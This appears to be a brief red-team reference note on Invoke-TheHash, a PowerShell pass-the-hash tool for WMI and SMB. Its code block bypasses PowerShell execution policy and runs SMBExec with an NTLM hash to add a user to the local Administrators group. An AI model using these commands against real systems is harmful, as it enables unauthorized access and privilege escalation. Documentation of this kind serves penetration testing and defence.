---
tags:
  - tool
---
# Invoke-TheHash

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) contains PowerShell functions for performing pass the hash WMI and SMB tasks. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privilege is not required client-side.

## Capabilities

```powershell
# Import-Module
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\Invoke-TheHash.psm1

# Execute SMB Command to add the user Grace to the Administrator's group
Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash $NTHASH -Command "net localgroup Administrators $USER /add"
```
